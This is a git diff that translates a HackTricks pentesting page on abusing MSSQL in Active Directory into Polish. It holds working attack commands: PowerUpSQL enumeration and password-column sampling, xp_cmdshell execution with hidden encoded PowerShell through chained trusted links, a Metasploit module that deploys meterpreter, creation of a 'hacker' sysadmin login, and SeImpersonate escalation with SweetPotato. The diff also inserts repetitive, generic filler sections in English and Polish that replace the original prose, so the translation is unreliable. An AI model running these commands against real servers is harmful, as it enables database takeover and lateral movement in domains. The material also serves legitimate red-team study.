@@ -1,27 +1,38 @@
-# MSSQL AD Abuse
+# Wykorzystywanie MSSQL w AD
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Pracujesz w **firmie cyberbezpieczeństwa**? Chcesz zobaczyć swoją **firmę reklamowaną w HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCJI**](https://github.com/sponsors/carlospolop)!
+* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
+* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
 
-## **MSSQL Enumeration / Discovery**
+## **Eksploracja / Odkrywanie MSSQL**
 
-The powershell module [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) is very useful in this case.
-
+Moduł PowerShell [PowerUpSQL](https://github.com/NetSPI/PowerUpSQL) jest bardzo przydatny w tym przypadku.
 ```powershell
 Import-Module .\PowerupSQL.psd1
 ```
+### Wyliczanie z sieci bez sesji domenowej
 
-### Enumerating from the network without domain session
+To enumerate from the network without a domain session, you can use the following techniques:
 
+1. **Port scanning**: Use tools like Nmap to scan the network for open ports on the target machine. Look for ports commonly used by Active Directory (AD) and Microsoft SQL Server (MSSQL), such as 389 (LDAP), 445 (SMB), and 1433 (MSSQL).
+
+2. **Service enumeration**: Once you have identified open ports, use tools like enum4linux or smbmap to enumerate services running on those ports. These tools can provide valuable information about the target system, including user accounts, group memberships, and shared resources.
+
+3. **LDAP enumeration**: If port 389 (LDAP) is open, you can use tools like ldapsearch or ADExplorer to query the AD server for information. This can include details about users, groups, organizational units, and more.
+
+4. **SMB enumeration**: If port 445 (SMB) is open, you can use tools like smbclient or CrackMapExec to enumerate shares, access files, and gather information about the target system.
+
+5. **MSSQL enumeration**: If port 1433 (MSSQL) is open, you can use tools like sqlmap or Metasploit to enumerate databases, tables, and columns, as well as extract data from the MSSQL server.
+
+Remember to always perform these enumeration techniques within the boundaries of legal and authorized penetration testing.
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -35,9 +46,31 @@ Get-Content c:\temp\computers.txt | Get-SQLInstanceScanUDP –Verbose –Threads
 #The discovered MSSQL servers must be on the file: C:\temp\instances.txt
 Get-SQLInstanceFile -FilePath C:\temp\instances.txt | Get-SQLConnectionTest -Verbose -Username test -Password test
 ```
+### Wyliczanie z wnętrza domeny
 
-### Enumerating from inside the domain
+W przypadku, gdy już uzyskamy dostęp do wewnętrznej sieci domeny, możemy przystąpić do wyliczania informacji na temat systemu Active Directory (AD) oraz baz danych Microsoft SQL Server (MSSQL). Poniżej przedstawiam kilka technik, które można zastosować w celu wykorzystania AD i MSSQL.
 
+#### Wykorzystywanie AD
+
+1. **Wykorzystywanie usług AD**: Sprawdzamy, jakie usługi są dostępne w AD, takie jak DNS, DHCP, LDAP, Kerberos itp. Możemy wykorzystać te usługi do zdobycia informacji o domenie.
+
+2. **Wykorzystywanie kont użytkowników**: Przeprowadzamy analizę kont użytkowników w celu znalezienia kont z nadmiernymi uprawnieniami lub słabymi hasłami. Możemy również sprawdzić, czy istnieją konta usunięte, które nadal mają dostęp do zasobów.
+
+3. **Wykorzystywanie grup**: Analizujemy grupy w AD w celu znalezienia grup z nadmiernymi uprawnieniami lub grup, które mogą być wykorzystane do eskalacji uprawnień.
+
+4. **Wykorzystywanie uprawnień**: Sprawdzamy, jakie uprawnienia mają konta użytkowników w AD. Możemy znaleźć konta z nadmiernymi uprawnieniami, które mogą być wykorzystane do uzyskania dostępu do innych zasobów.
+
+#### Wykorzystywanie MSSQL
+
+1. **Wykorzystywanie informacji o serwerze**: Sprawdzamy informacje o serwerze MSSQL, takie jak wersja, nazwa instancji, konfiguracja itp. Te informacje mogą pomóc nam w identyfikacji potencjalnych podatności.
+
+2. **Wykorzystywanie kont użytkowników**: Analizujemy konta użytkowników w bazie danych MSSQL w celu znalezienia kont z nadmiernymi uprawnieniami lub słabymi hasłami.
+
+3. **Wykorzystywanie procedur składowanych**: Sprawdzamy, czy istnieją procedury składowane, które mogą być wykorzystane do wykonania kodu na serwerze MSSQL.
+
+4. **Wykorzystywanie podatności**: Szukamy znanych podatności w serwerze MSSQL i wykorzystujemy je do uzyskania dostępu do danych lub eskalacji uprawnień.
+
+Pamiętaj, że przed przystąpieniem do wykorzystywania AD i MSSQL należy uzyskać odpowiednie uprawnienia i przestrzegać prawnych i etycznych zasad.
 ```powershell
 # Get local MSSQL instance (if any)
 Get-SQLInstanceLocal
@@ -45,7 +78,7 @@ Get-SQLInstanceLocal | Get-SQLServerInfo
 
 #Get info about valid MSQL instances running in domain
 #This looks for SPNs that starts with MSSQL (not always is a MSSQL running instance)
-Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose 
+Get-SQLInstanceDomain | Get-SQLServerinfo -Verbose
 
 #Test connections with each one
 Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -verbose
@@ -56,11 +89,55 @@ Get-SQLInstanceDomain | Get-SQLServerInfo -Verbose
 # Get DBs, test connections and get info in oneliner
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo
 ```
+### Dostęp do bazy danych MSSQL
 
-## MSSQL Basic Abuse
+#### 1. Wykorzystanie błędów w konfiguracji
 
-### Access DB
+W przypadku, gdy baza danych MSSQL jest źle skonfigurowana, istnieje możliwość uzyskania dostępu do niej. Oto kilka potencjalnych błędów konfiguracyjnych, które można wykorzystać:
 
+- Używanie słabych lub domyślnych haseł dla konta administratora bazy danych.
+- Brak zabezpieczeń sieciowych, takich jak firewall, które umożliwiają zdalny dostęp do bazy danych.
+- Niewłaściwe uprawnienia dla kont użytkowników, które umożliwiają wykonanie nieautoryzowanych operacji.
+
+#### 2. Wykorzystanie podatności
+
+MSSQL może mieć różne podatności, które można wykorzystać do uzyskania dostępu do bazy danych. Oto kilka przykładów popularnych podatności:
+
+- SQL Injection: Wykorzystanie nieodpowiednio zabezpieczonych zapytań SQL, aby wykonać nieautoryzowane operacje na bazie danych.
+- Remote Code Execution (RCE): Wykorzystanie podatności, która umożliwia wykonanie kodu na serwerze bazy danych.
+- Uzyskanie dostępu do konta administratora bazy danych poprzez podatność w mechanizmach uwierzytelniania.
+
+#### 3. Wykorzystanie słabych haseł
+
+Często administratorzy bazy danych używają słabych haseł, co ułatwia uzyskanie dostępu do bazy danych. Można wykorzystać różne techniki, takie jak brute force lub słownikowe ataki, aby złamać hasło i uzyskać dostęp.
+
+#### 4. Wykorzystanie słabych zabezpieczeń sieciowych
+
+Jeśli baza danych MSSQL jest źle zabezpieczona na poziomie sieciowym, można wykorzystać różne techniki, takie jak sniffing sieciowy, aby przechwycić dane uwierzytelniające i uzyskać dostęp do bazy danych.
+
+#### 5. Wykorzystanie błędów w aplikacjach korzystających z bazy danych
+
+Jeśli aplikacje korzystające z bazy danych MSSQL mają błędy w implementacji, można je wykorzystać do uzyskania dostępu do bazy danych. Przykłady takich błędów to nieodpowiednie sprawdzanie uprawnień użytkownika, niewłaściwe filtrowanie danych wejściowych itp.
+
+#### 6. Wykorzystanie słabych uprawnień użytkowników
+
+Jeśli użytkownicy mają nadmiarowe uprawnienia w bazie danych MSSQL, można wykorzystać te uprawnienia, aby uzyskać dostęp do danych lub wykonać nieautoryzowane operacje. Należy sprawdzić, czy istnieją konta użytkowników z nadmiarowymi uprawnieniami i wykorzystać je do uzyskania dostępu.
+
+#### 7. Wykorzystanie błędów w mechanizmach uwierzytelniania
+
+Jeśli mechanizmy uwierzytelniania w bazie danych MSSQL mają błędy, można je wykorzystać do uzyskania dostępu. Przykłady takich błędów to podatności w protokole uwierzytelniania, nieodpowiednie sprawdzanie tożsamości użytkownika itp.
+
+#### 8. Wykorzystanie błędów w konfiguracji serwera
+
+Jeśli serwer MSSQL jest źle skonfigurowany, można wykorzystać różne błędy konfiguracyjne, takie jak niewłaściwe ustawienia uprawnień, aby uzyskać dostęp do bazy danych.
+
+#### 9. Wykorzystanie błędów w procedurach składowanych
+
+Jeśli w bazie danych MSSQL istnieją procedury składowane z błędami, można je wykorzystać do uzyskania dostępu do bazy danych. Przykłady takich błędów to nieodpowiednie sprawdzanie uprawnień, niewłaściwe filtrowanie danych itp.
+
+#### 10. Wykorzystanie błędów w konfiguracji aplikacji
+
+Jeśli aplikacje korzystające z bazy danych MSSQL mają błędy w konfiguracji, można je wykorzystać do uzyskania dostępu do bazy danych. Przykłady takich błędów to niewłaściwe ustawienia uprawnień, nieodpowiednie filtrowanie danych wejściowych itp.
 ```powershell
 #Perform a SQL query
 Get-SQLQuery -Instance "sql.domain.io,1433" -Query "select @@servername"
@@ -72,32 +149,28 @@ Invoke-SQLDumpInfo -Verbose -Instance "dcorp-mssql"
 ## This won't use trusted SQL links
 Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLColumnSampleDataThreaded -Keywords "password" -SampleSize 5 | select instance, database, column, sample | ft -autosize
 ```
-
 ### MSSQL RCE
 
-It might be also possible to **execute commands** inside the MSSQL host
-
+Możliwe jest również **wykonanie poleceń** wewnątrz hosta MSSQL
 ```powershell
 Invoke-SQLOSCmd -Instance "srv.sub.domain.local,1433" -Command "whoami" -RawResults
 # Invoke-SQLOSCmd automatically checks if xp_cmdshell is enable and enables it if necessary
 ```
+Sprawdź na stronie wymienionej w **następnym rozdziale, jak to zrobić ręcznie**.
 
-Check in the page mentioned in the **following section how to do this manually.**
-
-### MSSQL Basic Hacking Tricks
+### Podstawowe triki hakowania MSSQL
 
 {% content-ref url="../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/" %}
 [pentesting-mssql-microsoft-sql-server](../../network-services-pentesting/pentesting-mssql-microsoft-sql-server/)
 {% endcontent-ref %}
 
-## MSSQL Trusted Links
+## Zaufane linki MSSQL
 
-If a MSSQL instance is trusted (database link) by a different MSSQL instance. If the user has privileges over the trusted database, he is going to be able to **use the trust relationship to execute queries also in the other instance**. This trusts can be chained and at some point the user might be able to find some misconfigured database where he can execute commands.
+Jeśli instancja MSSQL jest zaufana (link bazy danych) przez inną instancję MSSQL. Jeśli użytkownik ma uprawnienia do zaufanej bazy danych, będzie mógł **użyć relacji zaufania do wykonywania zapytań również w innej instancji**. Te zaufania mogą być łańcuchowe, a w pewnym momencie użytkownik może znaleźć źle skonfigurowaną bazę danych, w której może wykonywać polecenia.
 
-**The links between databases work even across forest trusts.**
+**Linki między bazami danych działają nawet w przypadku zaufania między lasami.**
 
-### Powershell Abuse
-
+### Nadużycie Powershell
 ```powershell
 #Look for MSSQL links of an accessible instance
 Get-SQLServerLink -Instance dcorp-mssql -Verbose #Check for DatabaseLinkd > 0
@@ -129,53 +202,45 @@ Get-SQLQuery -Instance "sql.domain.io,1433" -Query 'EXEC(''sp_configure ''''xp_c
 ## If you see the results of @@selectname, it worked
 Get-SQLQuery -Instance "sql.rto.local,1433" -Query 'SELECT * FROM OPENQUERY("sql.rto.external", ''select @@servername; exec xp_cmdshell ''''powershell whoami'''''');'
 ```
-
 ### Metasploit
 
-You can easily check for trusted links using metasploit.
-
+Możesz łatwo sprawdzić zaufane linki za pomocą metasploita.
 ```bash
 #Set username, password, windows auth (if using AD), IP...
 msf> use exploit/windows/mssql/mssql_linkcrawler
 [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter session
 ```
+Zauważ, że metasploit będzie próbował wykorzystać tylko funkcję `openquery()` w MSSQL (więc jeśli nie możesz wykonać polecenia za pomocą `openquery()`, będziesz musiał spróbować metody `EXECUTE` **ręcznie** w celu wykonania poleceń, zobacz więcej poniżej.)
 
-Notice that metasploit will try to abuse only the `openquery()` function in MSSQL (so, if you can't execute command with `openquery()` you will need to try the `EXECUTE` method **manually** to execute commands, see more below.)
+### Ręczne - Openquery()
 
-### Manual - Openquery()
+Z systemu **Linux** możesz uzyskać konsolę powłoki MSSQL za pomocą **sqsh** i **mssqlclient.py.**
 
-From **Linux** you could obtain a MSSQL console shell with **sqsh** and **mssqlclient.py.**
+Z systemu **Windows** możesz również znaleźć linki i wykonywać polecenia ręcznie za pomocą **klienta MSSQL, takiego jak** [**HeidiSQL**](https://www.heidisql.com)
 
-From **Windows** you could also find the links and execute commands manually using a **MSSQL client like** [**HeidiSQL**](https://www.heidisql.com)
-
-_Login using Windows authentication:_
+_Zaloguj się za pomocą uwierzytelniania systemu Windows:_
 
 ![](<../../.gitbook/assets/image (167) (1).png>)
 
-#### Find Trustable Links
-
+#### Znajdź zaufane linki
 ```sql
 select * from master..sysservers
 ```
-
 ![](<../../.gitbook/assets/image (168).png>)
 
-#### Execute queries in trustable link
+#### Wykonaj zapytania w zaufanym linku
 
-Execute queries through the link (example: find more links in the new accessible instance):
-
+Wykonaj zapytania za pomocą linku (przykład: znajdź więcej linków w nowo dostępnym egzemplarzu):
 ```sql
 select * from openquery("dcorp-sql1", 'select * from master..sysservers')
 ```
-
 {% hint style="warning" %}
-Check where double and single quotes are used, it's important to use them that way.
+Sprawdź, gdzie używane są cudzysłowy podwójne i pojedyncze, ważne jest, aby używać ich w ten sposób.
 {% endhint %}
 
 ![](<../../.gitbook/assets/image (169).png>)
 
-You can continue these trusted links chain forever manually.
-
+Możesz kontynuować tę łańcuch zaufanych linków w nieskończoność ręcznie.
 ```sql
 # First level RCE
 SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''powershell -w hidden -enc blah''')
@@ -183,35 +248,32 @@ SELECT * FROM OPENQUERY("<computer>", 'select @@servername; exec xp_cmdshell ''p
 # Second level RCE
 SELECT * FROM OPENQUERY("<computer1>", 'select * from openquery("<computer2>", ''select @@servername; exec xp_cmdshell ''''powershell -enc blah'''''')')
 ```
+Jeśli nie możesz wykonywać działań takich jak `exec xp_cmdshell` z `openquery()`, spróbuj zastosować metodę `EXECUTE`.
 
-If you cannot perform actions like `exec xp_cmdshell` from `openquery()` try with the `EXECUTE` method.
+### Instrukcja - EXECUTE
 
-### Manual - EXECUTE
-
-You can also abuse trusted links using `EXECUTE`:
-
+Możesz również nadużywać zaufanych linków za pomocą metody `EXECUTE`:
 ```bash
 #Create user and give admin privileges
 EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT "DOMINIO\SERVER1"') AT "DOMINIO\SERVER2"
 ```
+## Podwyższanie uprawnień lokalnych
 
-## Local Privilege Escalation
+Lokalny użytkownik **MSSQL** zazwyczaj posiada specjalny rodzaj uprawnienia o nazwie **`SeImpersonatePrivilege`**. Pozwala to na "udawanie klienta po uwierzytelnieniu".
 
-The **MSSQL local user** usually has a special type of privilege called **`SeImpersonatePrivilege`**. This allows the account to "impersonate a client after authentication".
+Strategią, którą wielu autorów opracowało, jest zmuszenie usługi **SYSTEM** do uwierzytelnienia się w fałszywej usłudze lub usłudze typu man-in-the-middle, którą tworzy atakujący. Ta fałszywa usługa jest w stanie udawać usługę **SYSTEM**, podczas gdy ta próbuje się uwierzytelnić.
 
-A strategy that many authors have come up with is to force a SYSTEM service to authenticate to a rogue or man-in-the-middle service that the attacker creates. This rogue service is then able to impersonate the SYSTEM service whilst it's trying to authenticate.
-
-[SweetPotato](https://github.com/CCob/SweetPotato) has a collection of these various techniques which can be executed via Beacon's `execute-assembly` command.
+[SweetPotato](https://github.com/CCob/SweetPotato) zawiera kolekcję różnych technik, które można wykonać za pomocą polecenia `execute-assembly` w narzędziu Beacon.
 
 <details>
 
-<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
-* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
-* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
-* **Share your hacking tricks by submitting PRs to the [hacktricks repo](https://github.com/carlospolop/hacktricks) and [hacktricks-cloud repo](https://github.com/carlospolop/hacktricks-cloud)**.
+* Pracujesz w **firmie zajmującej się cyberbezpieczeństwem**? Chcesz zobaczyć reklamę swojej **firmy na HackTricks**? A może chcesz mieć dostęp do **najnowszej wersji PEASS lub pobrać HackTricks w formacie PDF**? Sprawdź [**PLAN SUBSKRYPCYJNY**](https://github.com/sponsors/carlospolop)!
+* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
+* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
+* **Dołącz do** [**💬**](https://emojipedia.org/speech-balloon/) [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy Telegram**](https://t.me/peass) lub **śledź** mnie na **Twitterze** 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
+* **Podziel się swoimi trikami hakerskimi, przesyłając PR do repozytorium [hacktricks](https://github.com/carlospolop/hacktricks) i [hacktricks-cloud](https://github.com/carlospolop/hacktricks-cloud)**.
 
 </details>
